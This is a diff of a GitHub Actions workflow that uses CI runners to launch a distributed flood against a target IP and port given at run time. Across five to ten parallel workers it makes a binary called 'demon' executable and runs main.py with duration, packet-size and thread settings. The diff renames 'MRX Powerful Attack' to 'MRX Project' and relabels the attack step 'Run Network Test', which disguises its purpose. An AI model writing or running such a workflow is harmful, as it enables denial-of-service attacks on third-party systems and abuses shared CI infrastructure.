@@ -1,5 +1,4 @@
-name: "MRX Powerful Attack"
-
+name: "MRX Project"
 on:
   workflow_dispatch:
     inputs:
@@ -12,62 +11,28 @@ on:
         required: true
         type: string
       duration:
-        description: "Attack Duration (seconds)"
+        description: "Attack Duration"
         required: true
         type: string
       packet_size:
-        description: "Packet Size (bytes)"
+        description: "Packet Size"
         required: true
         type: string
       threads:
-        description: "Threads per worker"
+        description: "Connection Threads"
         required: true
         type: string
 
 jobs:
   network-test:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
     strategy:
-      fail-fast: false
       matrix:
-        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-    name: Worker ${{ matrix.worker }}
+        worker: [1, 2, 3, 4, 5]
     steps:
     - name: Checkout code
-      uses: actions/checkout@v4
-
-    - name: Setup Python
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.11'
-
-    - name: System Info
-      run: |
-        echo "Worker: ${{ matrix.worker }}"
-        echo "Target: ${{ inputs.ip }}:${{ inputs.port }}"
-        echo "Duration: ${{ inputs.duration }}s"
-        echo "CPU: $(nproc) cores"
-        ulimit -n 1048576 || true
-
+      uses: actions/checkout@v3
     - name: Make binary executable
-      run: |
-        chmod +x demon || true
-        ls -la demon
-
-    - name: Run Attack
-      env:
-        TARGET_IP: ${{ inputs.ip }}
-        TARGET_PORT: ${{ inputs.port }}
-        ATTACK_DURATION: ${{ inputs.duration }}
-        PACKET_SIZE: ${{ inputs.packet_size }}
-        THREADS: ${{ inputs.threads }}
-        WORKER_ID: ${{ matrix.worker }}
-      run: |
-        echo "Starting attack worker $WORKER_ID"
-        python3 main.py
-
-    - name: Report Results
-      if: always()
-      run: |
-        echo "Worker ${{ matrix.worker }} completed"
+      run: chmod +x demon
+    - name: Run Network Test
+      run: python3 main.py ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} ${{ inputs.packet_size }} ${{ inputs.threads }}
